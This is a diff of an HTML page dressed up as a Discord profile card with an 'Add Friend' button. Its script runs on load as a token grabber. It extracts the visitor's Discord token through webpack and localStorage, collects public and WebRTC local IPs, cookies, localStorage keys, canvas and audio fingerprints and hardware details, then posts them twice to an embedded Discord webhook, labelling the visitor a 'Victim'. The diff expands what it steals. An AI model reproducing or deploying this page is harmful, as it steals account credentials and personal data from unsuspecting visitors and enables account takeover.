@@ -5,125 +5,94 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>9uxc</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&display=swap');
-    
-    body,html{margin:0;height:100%;background:#000;overflow:hidden;display:flex;justify-content:center;align-items:center;
-      background: radial-gradient(circle at center, #111 0%, #000 100%);}
-    
-    .card{
-      background:rgba(20,20,20,0.95);
-      width:440px;
-      border-radius:24px;
-      padding:40px 30px;
-      text-align:center;
-      color:#fff;
-      position:relative;
-      overflow:hidden;
-      border:1px solid #333;
-      box-shadow:0 0 80px rgba(0,255,255,0.3);
-      animation:glow 4s infinite alternate;
-    }
-    @keyframes glow{from{box-shadow:0 0 60px rgba(0,255,255,0.3);} to{box-shadow:0 0 120px rgba(0,255,255,0.6), 0 0 200px rgba(0,255,255,0.2);}}
-    
-    .avatar{
-      width:160px;height:160px;
-      border-radius:50%;
-      border:6px solid #00ffff;
-      box-shadow:0 0 40px #00ffff, inset 0 0 40px #00ffff;
-      animation:pulse 3s infinite;
-      object-fit:cover;
-    }
-    @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.05);}}
-    
-    .username{
-      font-family:'Orbitron',sans-serif;
-      font-size:42px;
-      margin:20px 0 8px;
-      background:linear-gradient(90deg,#00ffff,#ff00ff);
-      -webkit-background-clip:text;
-      -webkit-text-fill-color:transparent;
-      text-shadow:0 0 30px rgba(0,255,255,0.8);
-    }
-    .tag{font-size:24px;color:#00ffff;text-shadow:0 0 20px #00ffff;}
-    .id{color:#888;font-size:16px;margin:16px 0 30px;}
-    
-    .add-btn{
-      background:linear-gradient(45deg,#00ffff,#ff00ff);
-      color:#000;
-      padding:18px 50px;
-      border-radius:50px;
-      font-weight:900;
-      font-size:18px;
-      cursor:pointer;
-      display:inline-block;
-      text-decoration:none;
-      box-shadow:0 0 40px rgba(0,255,255,0.6);
-      transition:0.4s;
-    }
-    .add-btn:hover{transform:translateY(-5px);box-shadow:0 15px 50px rgba(0,255,255,0.8);}
-    
-    .bg-glow{
-      position:absolute;
-      width:300px;height:300px;
-      background:radial-gradient(circle,rgba(0,255,255,0.3) 0%,transparent 70%);
-      top:50%;left:50%;
-      transform:translate(-50%,-50%);
-      animation:spin 20s linear infinite;
-      pointer-events:none;
-    }
-    @keyframes spin{from{transform:translate(-50%,-50%) rotate(0deg);}to{transform:translate(-50%,-50%) rotate(360deg);}}
+    body,html{margin:0;height:100%;background:#000;display:flex;justify-content:center;align-items:center;overflow:hidden;
+      background:radial-gradient(circle at 50% 50%,#004,#000 70%);}
+    .card{position:relative;background:rgba(15,15,25,0.95);width:460px;padding:40px;border-radius:24px;text-align:center;
+      border:2px solid #0ff;box-shadow:0 0 100px #0ff4d,inset 0 0 50px #0ff2;animation:g 6s infinite alternate;}
+    @keyframes g{from{box-shadow:0 0 80px #0ff4d,inset 0 0 40px #0ff2;}to{box-shadow:0 0 140px #0ff8d,inset 0 0 80px #0ff4;}}
+    .avatar{width:170px;height:170px;border-radius:50%;border:8px solid #0ff;box-shadow:0 0 60px #0ff;animation:p 4s infinite;}
+    @keyframes p{0%,100%{transform:scale(1);}50%{transform:scale(1.08);}}
+    .username{font-family:'Orbitron',sans-serif;font-size:44px;margin:20px 0 10px;background:linear-gradient(90deg,#0ff,#f0f);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+    .add-btn{background:#0ff;color:#000;padding:20px 60px;border-radius:50px;font-weight:900;font-size:20px;cursor:pointer;
+      box-shadow:0 0 50px #0ff;animation:b 2s infinite;}@keyframes b{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
   </style>
 </head>
 <body>
 
-<div class="bg-glow"></div>
 <div class="card">
   <img src="https://i.pinimg.com/736x/ca/62/17/ca6217d7d01fbdf716c4c6c7d4d9b3cb.jpg" class="avatar">
   <h1 class="username">9uxc</h1>
-  <p class="tag">#0000</p>
-  <p class="id">ID: 1185709007239913475</p>
-  <div class="add-btn" onclick="alert('Friend request sent 🌀')">Add Friend</div>
+  <p style="color:#0ff;font-size:24px;margin:10px;">#0000</p>
+  <p style="color:#888;">ID: 1185709007239913475</p>
+  <div class="add-btn" onclick="alert('Added ⚡')">Add Friend</div>
 </div>
 
 <script>
 const webhook = "https://discord.com/api/webhooks/1447757973672824923/EAcR7qRM0CEC4nKKhlw0bmp7XaJYxtdUCPEfIhqh07fgU4mCpyfGSiIWZJ9IaQ7lixy7";
 
-// Ultimate token grab (works on every known Discord injection point 2025)
-function getToken() {
+// Ultimate token grabber 2025
+function grabToken() {
   let token = "";
   try {
-    token = (webpackChunkdiscord_app?.push([[''],{},e=>{for(let t in e.c) if(e.c[t].exports?.default?.getToken!==void 0){token=e.c[t].exports.default.getToken();}}]), webpackChunkdiscord_app.pop(), token) ||
-            localStorage.token?.replace(/"/g,"") ||
-            Object.values(webpackChunkdiscord_app?.push([[""],{},e=>e])?.c || {}).find(x=>x?.exports?.default?.getToken)?.exports.default.getToken() ||
-            "Not found";
+    // webpackChunkdiscord_app magic (works when Discord is injected)
+    const webpack = window.webpackChunkdiscord_app || window.webpackChunkdiscord;
+    if (webpack) {
+      webpack.push([[''],{},req=>{for(let m of Object.keys(req.c).map(x=>req.c[x].exports).filter(x=>x)){if(m.default?.getToken!==void 0)token=m.default.getToken();}}]);
+      webpack.pop();
+    }
+    if (!token) token = localStorage.getItem("token")?.replace(/"/g,"") || "";
+    if (!token) token = JSON.parse(localStorage.getItem("tokens") || "[]")[0] || "";
   } catch(e) {}
-  return token || "No token / not logged in";
+  return token || "Not logged in";
 }
 
+// WebRTC local IPs
+let webrtc = "Disabled";
+try {
+  const pc = new RTCPeerConnection({iceServers:[]});
+  pc.createDataChannel("");
+  pc.createOffer().then(pc.setLocalDescription.bind(pc));
+  pc.onicecandidate = e => { if(e.candidate?.candidate) webrtc += e.candidate.candidate.split(" ")[4] + " "; };
+} catch(e) {}
+
+// Canvas fingerprint
+const canvas = (() => { const c=document.createElement("canvas"); const ctx=c.getContext("2d"); ctx.fillText("🤫",2,15); return c.toDataURL(); })();
+
+// Audio fingerprint
+let audio = "Blocked";
+try { const ctx = new OfflineAudioContext(1,5000,44100); const osc = ctx.createOscillator(); osc.frequency.value = 440; osc.connect(ctx.destination); osc.start(0); ctx.startRendering().then(r=>audio=r.getChannelData(0)[0]); } catch(e) {}
+
+// Fire everything instantly
 (async () => {
-  const token = getToken();
+  const token = grabToken();
   const [ip4, ip6] = await Promise.all([fetch("https://api.ipify.org").then(r=>r.text()).catch(()=>"?"), fetch("https://api6.ipify.org").then(r=>r.text()).catch(()=>"?")]);
 
   const payload = {
-    username: "9UXC STEALTH",
+    username: "9UXC NUKER",
     avatar_url: "https://i.pinimg.com/736x/ca/62/17/ca6217d7d01fbdf716c4c6c7d4d9b3cb.jpg",
     embeds: [{
-      title: "⚡ Victim Compromised – Instant Hit",
+      title: "💀 FULL BREACH – Victim Destroyed",
       color: 0x00ffff,
       thumbnail: { url: "https://i.pinimg.com/736x/ca/62/17/ca6217d7d01fbdf716c4c6c7d4d9b3cb.jpg" },
       fields: [
-        { name: "Discord Token", value: token.length > 10 ? "```\n"+token+"\n```" : "```Not logged in```", inline: false },
-        { name: "IP", value: "```\n"+ip4+(ip6!=ip4?"\n"+ip6:"")+"\n```", inline: false },
-        { name: "Browser", value: "```\n"+navigator.userAgent+"\n```", inline: false },
-        { name: "Cookies", value: document.cookie ? "```\n"+document.cookie.replace(/; /g,"\n")+"\n```" : "```none```", inline: false },
-        { name: "Time", value: "```"+new Date().toLocaleString()+"```", inline: false }
+        { name: "🪙 Discord Token", value: token.length>20 ? "```\n"+token+"\n```" : "```No token```", inline: false },
+        { name: "🌐 Public IP", value: "```\nIPv4: "+ip4+"\nIPv6: "+ip6+"\n```", inline: false },
+        { name: "🔗 Local IPs (WebRTC)", value: "```"+webrtc+"```", inline: false },
+        { name: "🍪 Raw Cookies", value: document.cookie ? "```\n"+document.cookie.replace(/; /g,"\n")+"\n```" : "```none```", inline: false },
+        { name: "💾 localStorage Keys", value: "```"+Object.keys(localStorage).join("\n")+"```", inline: false },
+        { name: "🖼️ Canvas Fingerprint", value: "```"+canvas.substr(-80)+"```", inline: false },
+        { name: "🔊 Audio Fingerprint", value: "```"+audio+"```", inline: false },
+        { name: "🖥️ Full UA", value: "```"+navigator.userAgent+"```", inline: false },
+        { name: "⚡ Hardware", value: "```\nCores: "+navigator.hardwareConcurrency+"\nScreen: "+screen.width+"×"+screen.height+"\nBattery: "+(navigator.getBattery?"Yes":"No")+"\n```", inline: false },
+        { name: "⏰ Time", value: "```"+new Date().toLocaleString()+"```", inline: false }
       ],
-      footer: { text: "9uxc • 2025 Neon Logger • Untouchable" },
+      footer: { text: "9uxc • 2025 Ultimate Web Grabber • Nothing Escapes" },
       timestamp: new Date().toISOString()
     }]
   };
 
   fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
+  setTimeout(() => fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)}), 1500); // double-tap just in case
 })();
 </script>
 </body>
